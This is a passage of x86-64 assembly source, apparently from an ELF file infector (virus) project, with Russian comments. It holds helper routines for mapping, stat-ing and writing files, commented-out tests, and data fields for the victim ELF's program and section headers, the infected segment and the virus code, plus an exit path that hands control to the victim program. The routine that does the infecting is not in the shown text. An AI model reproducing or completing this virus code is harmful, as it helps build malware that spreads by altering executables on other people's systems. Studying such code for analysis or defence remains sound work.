//     mov     $0x11, %rdx
//     call    write

//     popq    %rbp
// 	ret


    # принимает в rdi адрес массив, в rsi - его размер, заполняет массив нулями
clear_array:
    pushq   %rbp
	movq    %rsp, %rbp

    push    %rcx
    mov     %rsi, %rcx

clear_array_cycle:
    movb    $0x0, (%rdi)
    inc     %rdi
    loop    clear_array_cycle

clear_array_end:

    pop     %rcx
    popq    %rbp
	ret

//      /* MY_PRINTF
//     Отладочный вывод. Может вывести строку, число, или и то, и то.

//     @PARAMS
//     # RDI - string
//     # RSI - число для вывода
//     # RDX - основание системы счисления, в которой надо вывести число
//     # или 0, если вывода числа нет,
//     # в r8 - размер строки, если она есть TODO: заменить r8 на rcx
//     */

// my_printf:
//     push    %rcx
//     push    %rax
//     push    %rdx

//     mov     %rdi, %rcx
//     mov     %rsi, %rax

//     cmp     $0, %rdx
//     je      print_string

//     cmp     $16, %rdx
//     je      cnvrt_hex_num

//     jmp     print_string

// cnvrt_hex_num:
//     mov     $byted_addr, %rdi   # очищаем массив (там могло быть другое число)
//     mov     $0x10, %rsi

//     call    clear_array

//     mov     $converted_addr, %rdi
//     mov     $0x11, %rsi

//     call    clear_array

//     mov     %rax, %rdi               # забираем число
//     call    cnvrt_addr_in_16_byte

//     mov     $byted_addr, %rsi
//     call    cnvrt_num_to_hex_string   # преобразовываем в строку

// print_string:
//     mov     %rcx, %rsi # забрали строку

//     cmp     $0, %rsi
//     je      print_num

//     mov     $0, %rdi

//     mov     %r8, %rdx
//     call    _my_write

// print_num:
//     pop     %rdx      # забрали снование системы счисления
//     cmp     $0, %rdx
//     je      my_printf_end

//     xor     %rdi, %rdi
//     mov     $converted_addr, %rsi
//     mov     $0x11, %rdx

//     call    _my_write

// my_printf_end:
//     pop     %rax
//     pop     %rcx
// 	ret

// test_my_printf1:
//     mov     $msg, %rdi
//     mov     $0x3041d23e2, %rsi
//     mov     $0x10, %rdx
//     mov     $0x13, %r8

//     call    my_printf
// 	ret

// test_my_printf2:
//     mov     $0x0, %rdi
//     mov     $0x3041d23e2, %rsi
//     mov     $0x10, %rdx
//     mov     $0x0, %r8

//     call    my_printf

//     ret

// test_my_printf3:

//     mov     $msg, %rdi
//     mov     $0x0, %rsi
//     mov     $0x0, %rdx
//     mov     $0x13, %r8

//     call    my_printf
// 	ret


//     /* CNVRT_ADDR_IN_16_BYTE
//     Конвертирует восьмибайтовое число в такое же 16-байтовое, т.е. каждые полбайта
//     занимают байт на выходе. Конвертация начинается с младших радряов числа.
//     Сконвертированное число записывается в массив byted_addr

//      Конвертация происходит за 16 итераций цикла, на каждой итерации:
//     - на конвертируемое число накладывается маска
//     - полученное число сдвигается вправо на 4 бита столько раз,
//       сколько было итераций цикла, чтоб результат оказался в младших разрядах
//     - результат записывается в следующий доступный байт массива byted_addr
//     - маска сдвигается на 4 бита влево */

//     /* * @PARAMS
//        * %RDI - число для конвертирования */

byted_addr:
    .space  16, 0

cnvrt_addr_in_16_byte:
    push    %r8
    push    %r9
    push    %rcx
    push    %rdx
    push    %rbx
    push    %rsi

    // SETUP VALUES
    mov     %rdi, %rdx
    lea     byted_addr(%rip), %rsi

    add     $0xF, %rsi    # конвертация начинается с младниших байт числа
    mov     $0x10, %rcx   # loop cntr

    mov     $0xF, %rbx     # маска для числа

   // CONVERT NUMBER
cnvrt_addr_loop:
    and     %rbx, %rdx    # наложитьм маску на число

    mov     $0x10, %r8    # высчитать кол-во пройденных итераций
    mov     %rcx, %r9
    sub     %r9, %r8

    // ROTATE NUM RIGHT
rotate_num_right:
    cmp     $0, %r8
    jle     continue_cnvrt_addr_loop

    shr     $0x4, %rdx
    dec     %r8
    jmp     rotate_num_right

continue_cnvrt_addr_loop:
    movb    %dl, (%rsi)   # записать число по адресу
    mov     %rdi, %rdx    # восстановить исходное число
    shl     $0x4, %rbx    # сдвинуть маску на 4 бита влево
    dec     %rsi          # сдвинуть укатель на следующий свободный байт массива

    loop   cnvrt_addr_loop

    pop     %rsi
    pop     %rbx
    pop     %rdx
    pop     %rcx
    pop     %r9
    pop     %r8

    ret

// // TEST_CNVRT_ADDR_IN_16_BYTE
// /* тестирует конвертацию числа
//     если не подключать конвертациж полученного числа и не выводить его на экран,
//     то посмотреть результат можно только в гдб
//     TODO решить эту проблему */

// // test_cnvrt_addr_in_16_byte:
// //     mov     $0xFFFFFFFF, %rdi
// //     call    cnvrt_addr_in_16_byte

// //     ret


//     // TEST_CNVRT_ADDR_IN_16_BYTE

// /*
//     цель теста:
//     - сконвертировать восьмибайтовое число в 16-байтовый массив
//     - сконвертировать каждый байт этого массива в ascii-код
//     - вывести полученное число в stdout */
// test_cnvrt_addr_in_16_byte:
//     pushq   %rbp
// 	movq    %rsp, %rbp

//     // mov     $0x40, %rdi        # тесты с разными числами
//     // mov     $0xFFFFFFFFFFFFFFFF, %rdi
//     // mov     $0x8FFFE, %rdi
//     mov     $0xDEADBEEFBAADF00D, %rdi
//     // mov     $-31, %rdi   # (?)

//     call    cnvrt_addr_in_16_byte

//     mov     $byted_addr, %rsi
//     call    cnvrt_num_to_hex_string

//     mov     $converted_addr, %rsi
//     mov     $0x11, %rdx

//     call    _my_write

//     popq    %rbp
// 	ret

    // MY_MMAP file into memory
    // Считывает файл в память по заданному адресу.
    // Флаги должны быть такими же, какие передавали
    // open дляоткрытия файла.
    // @PARAMS
    //  - %RDI - адрес для записи (по умолчанию NULL,
    //           в этом случае назначается OS)
    //  - %RSI - длина считываемого файла
    //  - %RDX - права доступа к памяти
    //           (RDONLY, RDWR и т.д.)
    //  - %RCX -  права для доступа к памяти для
    //            процессов (MMAP_SHARED, MMAP_PRIVATE)
    //  * %R8 -   fd считываемого файла
    //  * %R9 -   offset от начала считываемого файла
_my_mmap:
    push %rbx
	push %rcx
	push %rdx
	push %rbp
	push %r10

	mov %r9, %r15
	mov %rsi, %r13
	mov %rdi, %r12
	mov %ecx, %r14d

	movslq %r8d, %rbp
	movslq %edx, %rbx
	movslq %r14d, %r10
	mov $0x9, %eax

	syscall

	pop %r10
	pop %rbp
	pop %rdx
	pop %rcx
	pop %rbx

	ret

// /* MY_MEMCPY
//   Побайтово записывает данный в размере bytesz из памяти src в память dest

//  * @PARAMS
//  *   - %RDI - ptr dest
//  *   - %RSI - ptr src
//  *   - %RDX - bytesz
//  */

// my_memcpy:

//     pushq    %rcx
//     pushq    %rax

//     // loop cnt
//     movq     %rdx, %rcx

// cycle_my_memcpy:

//     movq	%rsi, %rax
//     movzbl	(%rax), %edx

// 	movq	%rdi, %rax
// 	movb	%dl, (%rax)

//     inc      %rdi
//     inc      %rsi

//     loop     cycle_my_memcpy

// my_memcpy_exit:
//     popq     %rax
//     popq     %rcx

//     ret

// // MY_MEMCPY TEST
// _memcpy_test_msg:
//    .ascii "Test memcpy msg\n"
//    .set len_memcpy_test_msg, . - _memcpy_test_msg

// memcpy_test_buf:
//     .space 40, 0

//     // цель теста: скопировать строку в буфер и вывести ее в stdout
// test_my_memcpy:
//     lea     memcpy_test_buf(%rip), %rdi
//     lea     _memcpy_test_msg(%rip), %rsi
//     mov     $len_memcpy_test_msg, %rdx

//     call    my_memcpy

//     mov     $0x1, %rdi
//     lea     memcpy_test_buf(%rip), %rsi
//     mov     $len_memcpy_test_msg, %rdx

//     call    _my_write
// 	ret


// MY_STAT
// @PARAMS
// %RDI - file name
// %RSI - stat struct pointer
_my_stat:
    // stat изменяет этот регистр
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~
    // NB: Any syscall destroys %rcx and %r11
    // Почему это происходит?
    // Инструкция входа в режим ядра syscall
    // сохраняет в регистре RCX значение RIP,
    // а в R11 – значение регистра флагов и
    // переходит к выполнению функции ядра
    // (адрес которой хранится в специальном
    // Model Specific -регистре).
    // Инструкция sysret же выполняет всё наоборот:
    // восстанавливает RIP из регистра RCX и регистр
    // флагов (почти весь) из регистра R11.
    // Поскольку в x64 кол-во регистров довольно
    // много, а RCX и R11 не участвуют в передаче
    // параметров, создатели системы решили не
    // заморачиваться с сохранением этих регистров
    // (возможно, заодно и для ускорения системного
    // вызова и возврата)
    push    %rcx

    mov     $0x04, %rax
    syscall
    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop    %rcx
  	ret
    ERR_MSG _my_stat "my_stat"


    // OPENFILE
    // Открывает файл с указанными флагами,
    // маппит его в память, возвращает
    // указатель на начало файла в памяти
    //
    // @PARAMS
    // %RDI - file name
    // %RSI - flags
_openfile:
    push    %rbp
    mov     %rsp, %rbp

    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax
    jl      _openfile_neg_fd_error

    // save all regs
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9
    push    %r10

    // space for local vars
    sub     $0xA0, %rsp

    mov     %rax, %rcx          # fd
    mov     %rsi, %rdx          # openfile flags

    // call stat
    // (need no less 0xA0 for struct stat)
    leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
    call    _my_stat

    // prepare params for mmap
    mov     %rcx, %r8           # fd
    mov     %rdx, %rax          # flags
    xor     %rdi, %rdi          # addr

    // 0x70 - offset to filesz field in stat struct
    mov     -0x70(%rbp), %rsi   # filesz
    xor     %r9, %r9            # offset

    // doesn't need shared mmap
    mov     $MAP_PRIVATE, %rcx

    mov     $O_RDONLY, %rbx
    cmp     %rbx, %rax
    je      mmap_rdonly

    // define mmap flags
    mov     $O_RDWR, %rbx
    cmp     %rbx, %rax
    jne     _openfile_flags_error

mmap_rdwr:
    mov     $(PROT_READ | PROT_WRITE), %rdx # prot
    jmp     call_my_mmap

mmap_rdonly:
    mov     $PROT_READ, %rdx            # prot
    // call mmap
call_my_mmap:
    call    _my_mmap
    test    %rax, %rax
    jle     _openfile_ptr_error

    // recover stack
    add     $0xA0, %rsp
    pop     %r10
    pop     %r9
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

_openfile_exit:
    pop     %rbp
	ret

    ERR_MSG _openfile_neg_fd "openfile neg fd"
    ERR_MSG _openfile_flags "openfile undefined flags"
    ERR_MSG _openfile_ptr "openfile returned zero ptr"


// /* MY_FREAD

//     Читает bytesz n раз из спаменной памяти в указанную область памяти

//  * @PARAMS
//     * %RDI - dest
//     * %RSI - src
//     * %RDX - iter cntr
//     * %RCX - bytesz
//     */

// _my_fread:

//     push    %rcx
//     push    %rax
//     push    %rbx

//     mov     %rcx, %rbx
//     movq    %rdx, %rcx   # loop cnt

// cycle_fread:
//     mov    %rbx, %rdx
//     call    my_memcpy
//     loop    cycle_fread

// _fread_exit:
//     pop     %rbx
//     pop     %rax
//     pop     %rcx
// 	ret


// // TEST MY_FREAD

// /*
//     цель теста:
//     смаппить содержимое file_name в память, прочитать  данные из памяти в массив,
//     вывести прочитанное в stdout

//     у теста есть один недостаток: размер открытого файла не высчитывается,
//     а устанавливается вручную. На данный момент это 37 байт.
// */

// test_fread_filenm:
//     .string  "test_my_fread.txt"

// test_fread_buf:
//     .space 37, 0

// test_my_fread:

//     mov     $test_fread_filenm, %rdi
//     // mov     $dnt_exist_filenm, %rdi   # тест ошибки открытия файла

//     // MMAP FILE
//     mov     $O_RDWR, %rsi
//     call    openfile

//     cmp     $0, %rax
//     jle     test_fread_exit

//     mov     %rax, %rbx

//     // SET PARAMS FOR MY_FREAD
//     lea     test_fread_buf(%rip), %rdi  # dest
//     mov     %rbx, %rsi                  # src
//     mov     $0x1, %rdx                  # iter cnt
//     mov     $0x25, %rcx                  # filesz

//     call    _my_fread

//     // PRINT RESULT
//     mov     $0x1, %rdi
//     lea     test_fread_buf(%rip), %rsi
//     mov     $0x25, %rdx                  # filesz
//     call    _my_write

// test_fread_exit:
// 	ret


// Close
// @PARAMS
//   - %RDI - fd
//
// close:
//     mov     $0x2, %rax
//     syscall
// 	ret

fd:
   .long 0

victim_elf_addr:
	.quad 0

victim_phdr_table_addr:
	.quad 0

victim_phdr_table_size:
	.quad 0

victim_phdr_amount:
	.quad 0

victim_shdr_table_addr:
	.quad 0

victim_shdr_table_size:
	.quad 0

victim_shdr_amount:
    .quad 0

infected_seg_addr:
	.quad 0

infected_seg_end_vaddr:
	.quad 0

infected_seg_size:
	.quad 0

infected_sect_addr:
	.quad 0

victim_code_before_infect_point_size:
	.quad 0

victim_code_after_infect_point_addr:
	.quad 0

victim_code_after_infect_point_size:
	.quad 0

virus_code_addr:
	.quad 0

virus_code_size:
	.quad 0

infected_seg_vaddr_end:
	.quad 0

_canary:
    .quad CANARY_VAL

_stack_top:
    .space 6000, 0
_stack_bottom:
    .quad 0


    // -------------------------------------------
_data:

// dnt_exist_filenm:
//     .string  "test2.txt"

// file_name2:
//     .string  "asm-test2.txt"

_file_name3:
    .string  "example"

virus_file_name:
    .string  "asm"

new_elf_file:
    .string "test_inf"

// msg:
//     .string "write test string \n"

// msg2:
//     .string "fwrite test string \n"

// # сообщения, которые будут использоваться при распечатке полей эльф-хедера
// e_type_msg:
//     .string "ElfHdr e_type: "
// e_machine_msg:
//     .string "ElfHdr e_machine: "
// e_version_msg:
//     .string "ElfHdr e_version: "
// e_entry_msg:
//     .string "ElfHdr e_entry: "
// e_phoff_msg:
//     .string "ElfHdr e_phoff: "
// e_shoff_msg:
//     .string "ElfHdr e_shoff: "
// e_ehsize_msg:
//     .string "ElfHdr e_ehsize: "
// e_flags_msg:
//     .string "ElfHdr e_flags: "
// e_phentsize_msg:
//     .string "ElfHdr e_phentsize: "
// e_phnum_msg:
//     .string "ElfHdr e_phnum: "
// e_shentsize_msg:
//     .string "ElfHdr e_shentsize: "
// e_shnum_msg:
//     .string "ElfHdr e_shnum: "
// e_shstrndx_msg:
//     .string "ElfHdr e_shstrndx: "

//  # сообщения, которые будут использоваться при распечатке полей заголовка программ
// p_type_msg:
//     .string "PhHdr p_type: "
// p_flags_msg:
//     .string "PhHdr p_flags: "
// p_offset_msg:
//     .string "PhHdr p_offset: "
// p_vaddr_msg:
//     .string "PhHdr p_vaddr: "
// p_paddr_msg:
//     .string "PhHdr p_paddr: "
// p_filesz_msg:
//     .string "PhHdr p_filesz: "
// p_memsz_msg:
//     .string "PhHdr p_memsz: "
// p_align_msg:
//     .string "PhHdr p_align: "

// # сообщения, которые будут использоваться при распечатке полей заголовка секций
// sh_name_msg:
//     .string "ShHdr sh_name: "
// sh_type_msg:
//     .string "ShHdr sh_type: "
// sh_flags_msg:
//     .string "ShHdr sh_flags: "
// sh_addr_msg:
//     .string "ShHdr sh_addr: "
// sh_offset_msg:
//     .string "ShHdr sh_offset: "
// sh_size_msg:
//     .string "ShHdr sh_size: "
// sh_link_msg:
//     .string "ShHdr sh_link: "
// sh_info_msg:
//     .string "ShHdr sh_info: "
// sh_addralign_msg:
//     .string "ShHdr sh_addralign: "
// sh_entsize_msg:
//     .string "ShHdr sh_entsize: "

// next_str:
//     .string "\n"

// WRITE TO STDOUT
// @PARAMS
//   - %RSI - msg pointer
//   - %RDX - msg size
_my_write:
    mov     $0x1, %rax          # write
    mov     %rax, %rdi          # to stdout
    syscall
    ret

// ERROR HANDLING
// @PARAMS
//   - %RSI - msg pointer
//   - %RDX - msg size
_error_msg:
    .ifdef DEBUG_MODE
    call    _my_write
    .endif
    jmp _end_infector

_end_infector:
    mov     _old_rsp(%rip), %rsp     # restore old %RSP
    jmp     _start_victim
_fin_infector:
     nop
